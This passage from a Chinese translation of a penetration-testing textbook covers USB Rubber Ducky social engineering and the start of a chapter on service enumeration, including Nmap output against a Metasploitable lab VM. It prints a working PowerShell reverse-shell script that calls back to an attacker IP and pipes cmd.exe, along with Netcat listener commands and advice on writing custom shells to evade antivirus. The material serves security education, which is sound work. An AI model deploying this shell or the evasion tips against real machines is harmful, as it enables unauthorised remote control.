  Documents\\Shared>\n```\n\n## 使用 USB Rubber Ducky 进行社会工程\n\nUSB Rubber Ducky 是社会工程攻击的一种极佳发明。你可以在\
  \ hak5 商店购买它，它附带了向你展示其如何工作的教程：\n\n[`shop.hak5.org/products/usb-rubber-ducky-deluxe`](https://shop.hak5.org/products/usb-rubber-ducky-deluxe)\n\
  \nUSB Rubber Ducky 在《黑客》第二季中使用是因为它的攻击非常有效，所以什么比这种在好莱坞剧剧中展示的工具更好呢？\n\n为什么这个工具如此吸引人？USB\
  \ Rubber Ducky 不是 USB 闪盘，它是一个模拟键盘的 HID（人机接口）。当你将其插入电脑时，电脑会认为它是一个键盘并允许它以极快的输入命令。\n\
  \nUSB Rubber Ducky 可用于各种攻击，例如：\n*   外泄数据\n*   安装恶意软件\n*   创建后门\n\n要使用 USB Rubber\
  \ Ducky，你需要使用一种名为 Ducky Script 的特殊语言编写脚本。该脚本定义了 Ducky 在插入时执行的命令。\n\n\n\n\n通常情况下，当你将\
  \ USB Rubber Ducky 插入受害者的电脑时，它会自动执行脚本。但如果脚本没有执行或执行失败，你可以选择点击中间的小型黑色 Run 按钮来手动运行。（查看图\
  \ 5.5；它看起来像一个小小的重置按钮。）\n\n### 使用 USB Rubber Ducky 和 PowerShell 实现反向 Shell\n\n本章最后提供了一个针对\
  \ Windows 操作系统的 PowerShell 反向 Shell 实用方案。这种脚本语言由微软发明，是 Linux 操作系统中 Bash 的替代品。在学习如何在实践中利用这一行为之前，以下是场景中使用的步骤：\n\
  \n1. 使用 `SET` 生成一个 PowerShell 反向 Shell。\n2. 在 Kali 主机上启动监听器（listener）。\n3. 在 Kali\
  \ Web 服务器上托管 `.ps1` PowerShell 文件。\n4. 切换到 Windows 主机并以管理员模式运行 PowerShell。\n5. 执行命令以下载并执行托管在\
  \ Kali 虚拟机上的 `.ps1` 脚本。\n6. 检查 Windows 主机上是否已建立反向 Shell。\n7. 使用 USB Rubber Ducky\
  \ 重新创建 PowerShell 场景。\n\n### 生成 PowerShell 脚本\n\n打开 SET ，并执行以下步骤：\n\n1. 选择选项 1：社会工程攻击（Social-Engineering\
  \ Attacks）。\n2. 选择选项 9：PowerShell 攻击向量（PowerShell Attack Vectors）。\n3. 选择选项 2：PowerShell\
  \ 反向 Shell（PowerShell Reverse Shell）。\n\n接下来，你会被要求输入 Kali IP 地址。（我的 Kali IP 地址是\
  \ 10.0.20.140。）输入你想要监听的端口（在本例中我们将 443，它代表用于混淆的 HTTPS/TLS）。最后，系统会询问你是否要启动监听器，选择 `no`。（你很快就会明白为什么了）：\n\
  \n``````\n Enter the IPAddress or DNS name for the reverse host: 10.0.20.140\nset:powershell>\
  \ Enter the port for listener [443]:443\n[*] Rewriting the powershell reverse shell\
  \ with options\n[*] Exporting the powershell stuff to /root/.set/reports/powershell\n\
  set> Do you want to start a listener [yes/no]: no\n```\n\n### 启动监听器\n\n在上一步中，我们选择不启动监听器，因为我们想观察不同的模式。现在你已经知道了反向\
  \ Shell 的工作原理，我们将使用 Netcat 在 Kali 节点手动启动监听器。你也可以使用 Metasploit，但为了简单起见，我们坚持 Netcat：\n\
  \n```\n root@kali:~# nc -nlvp 443\nlistening on [any] 443 …\n\n-n: 不进行 DNS 查询\n\
  -l: 监听模式\n-v: 详细模式\n-p: 设置监听端口号\n```\n\n### 托管 PowerShell 脚本\n\nSET 工具已以下路径生成了一个文本文件：\n\
  \n```\n ~/.set/reports/powershell/powershell.reverse.txt\n```\n\n如果你打开该文件，你会发现 SET\
  \ 已经为你填好了 IP 地址和端口号：\n\n``````\n function cleanup {\nif ($client.Connected -eq $true)\
  \ {$client.Close()}\nif ($process.ExitCode -ne $null) {$process.Close()}\nexit}\n\
  // Setup IPADDR\n$address = '10.0.20.140'\n// Setup PORT\n$port = '443'\n$client\
  \ = New-Object system.net.sockets.tcpclient\n$client.connect($address,$port)\n$stream\
  \ = $client.GetStream()\n$networkbuffer = New-Object System.Byte[] $client.ReceiveBufferSize\n\
  $process = New-Object System.Diagnostics.Process\n$process.StartInfo.FileName =\
  \ 'C:\\\\windows\\\\system32\\\\cmd.exe'\n$process.StartInfo.RedirectStandardInput\
  \ = 1\n$process.StartInfo.RedirectStandardOutput = 1\n$process.StartInfo.UseShellExecute\
  \ = 0\n$process.Start()\n$inputstream = $process.StandardInput\n$outputstream =\
  \ $process.StandardOutput\nStart-Sleep 1\n$encoding = new-object System.Text.AsciiEncoding\n\
  while($outputstream.Peek() -ne -1){$out += $encoding.GetString($outputstream.Read())}\n\
  $stream.Write($encoding.GetBytes($out),0,$out.Length)\n$out = $null; $done = $false;\
  \ $testing = 0;\nwhile (-not $done) {\nif ($client.Connected -ne $true) {cleanup}\n\
  $pos = 0; $i = 1\nwhile (($i -gt 0) -and ($pos -lt $networkbuffer.Length)) {\n$read\
  \ = $stream.Read($networkbuffer,$pos,$networkbuffer.Length - $pos)\n$pos+=$read;\
  \ if ($pos -and ($networkbuffer[0..$($pos-1)] -contains 10)) {break}}\nif ($pos\
  \ -gt 0) {\n$string = $encoding.GetString($networkbuffer,0,$pos)\n$inputstream.write($string)\n\
  start-sleep 1\nif ($process.ExitCode -ne $null) {cleanup}\nelse {\n\n$out = $encoding.GetString($outputstream.Read())\n\
  while($outputstream.Peek() -ne -1){\n$out += $encoding.GetString($outputstream.Read());\
  \ if ($out -ne $null)}\n```\n\n\n\n\n在本章中，你学习了许多社会工程攻击的技术，但如何判断哪一个是最好的，以及如何在正确的场景下选择它呢？在开始规划你的社会工程之前，你需要了解以下通用指南：\n\
  \n* 首先，确保你在准备电子邮件信息或拨打电话时，它们具有足够的吸引力和专业性，以便最终用户“上钩”。\n* 其次，成功的社会工程攻击的秘密在于充分的准备。因此，规划你的攻击将增加你成功的几率。\n\
  * 接下来是感染阶段。如果你想在攻击中使用硬件工具包，请确保使用的是优质设备，例如 `USB Rubber Ducky`。现在，如果你坚持在攻击中使用 U 盘，那也可以，但不要尝试使用自动运行功能，因为那已经过时了。此外，现在的公司对\
  \ U 盘感染非常警惕并已经实施了安全措施来防护。\n* 正如你可能注意到的，感染 Windows 机器常用的方法是使用 `PowerShell`。在实战中，不要使用像\
  \ Metasploit 中预生成的反 shell（reverse shells），因为杀毒软件会轻易捕捉它们。使用反 shell 的最佳方法是使用你喜欢的编程语言（如\
  \ `PowerShell`、`C++` 或 `Java`）自己开发，你将在后续章节学习更多关于反 shell 的知识。\n\n# 第 6 章 高枚举阶段\n\n\
  在本章中，你将学习如何在渗透测试中处理枚举阶段。枚举意味着收集必要的信息以便我们利用特定的服务（例如 `FTP`、`SSH` 等）。例如，`SSH` 服务的暴力破解将使我们能够获取有效凭据并登录远程主机。另一种常见做法是使用\
  \ `Nmap` 脚本收集远程用户、服务版本、远程代码执行等信息。本章不会涵盖所有服务，但最关键的部分是理解枚举的概念，以便将其应用于任何类型的服务。本章涵盖了：\n\
  \n* `FTP`\n* `SSH`\n* `Telnet`\n* `SMTP`\n* `POP3` 和 `IMAP`\n* `Microsoft SQL`\n\
  * `Oracle Database`\n* `MySQL`\n* `Docker Engine`\n* `Jenkins`\n* `HTTP/S`\n* `RDP`\n\
  * `VNC`\n* `SMB`\n* `SNMP`\n\n在此之前，你学习了如何扫描网络并识别每个主机上的服务。在这个阶段，你已经如何使用 `Nmap` 完成任务。扫描完每个主机后，我们需要开始调查潜在漏洞。例如，你发现目标是一个\
  \ Linux 主机，并使用 `SSH` 服务允许远程用户身份验证。你知道下一步做什么吗？在接下来的章节中，你将看到允许你枚举常用服务的逻辑结构。\n\n###\
  \ FTP (端口 21)\n\nFTP 用于客户端和远程服务器之间传输文件。后者用于存储文件以便你可以远程访问。有时 `FTP` 用于 Web 应用程序同步源代码（例如\
  \ `HTML`、`JavaScript` 等）。`FTP` 的两种安全实现是 `FTPS` 和 `SFTP`。安全文件传输协议 (`SFTP`) 使用 `SSH`\
  \ 协议传输文件（默认使用 `SSH` 的端口 22）。另一方面，安全文件传输协议 (`FTPS`) 使用 `SSL` 加密文件传输，并使用端口 989 和 990。\n\
  \n这些是 `FTP` 协议的常见缺陷：\n\n* 登录凭据以明文发送。\n* 文件传输未加密。\n\n#### FTP 服务器的利用场景\n\n在这个阶段，了解该服务的利用方式至关重要（你需要预先知道你在找什么，否则你只是闭眼扫描）。`FTP`\
  \ 服务器可以通过不同的方式被利用。以下是你在执行过程中可能会遇到的常见场景：\n\n* 凭据暴力破解\n* 嗅探明文凭据\n* 嗅探未加密文件\n* 匿名访问\n\
  * 寻找与目标 `FTP` 服务器版本相关的公开漏洞（在下一章中将学习如何搜索公开漏洞）\n\n#### 枚举工作\n\n在本章中，你将通过真实示例学习每个服务的枚举工作（一例胜过万言）。在这个示例中，目标主机是一个\
  \ Linux 漏洞虚拟机，名为 `Metasploitable` 版本 2；你可以从 [information.rapid7.com/download-metasploitable-2017.html](http://information.rapid7.com/download-metasploitable-2017.html)\
  \ 获取该主机的虚拟机副本。\n\n### 服务扫描\n\n第一步，我们将在 `Nmap` 中运行基础服务扫描以了解目标 `FTP` 服务器的情况：\n\n```\n\
  root@kali:~# nmap -sV -O -sC -p21 -T5 metasploitable.kcorp.local\nStarting Nmap\
  \ 7.80 ( https://nmap.org ) at 2020-06-04 14:33 EDT\nNmap scan report for metasploitable.kcorp.local\
  \ (172.16.0.101)\nHost is up (0.0062s latency).\n\nPORT   STATE SERVICE VERSION\n\
  21/tcp open  ftp     vsftpd 2.3.4\n|_ftp-anon:             Anonymous login allowed\
  \ (FTP code 230)\n| ftp-syst:\n      Connected to 172.16.0.102\n      Logged in\
  \ as ftp\n      TYPE: ASCII\n      No session bandwidth limit\n      Session timeout\
  \ in seconds is 300\n      Control connection is plain text\n      Data connections\
  \ will be plain text\n      vsFTPd 2.3.4 - secure, fast, stable\n|_End of status\n\
  MAC Address: 00:0C:29:D2:1A:B1 (VMware)\nWarning: OSScan results may be unreliable\
  \ because we could not find at least 1 open and 1 closed port\nDevice type: general\
  \ purpose\nRunning: Linux 2.6\nOS CPE: cpe:/o:linux:linux_kernel:2.6\nOS details:\
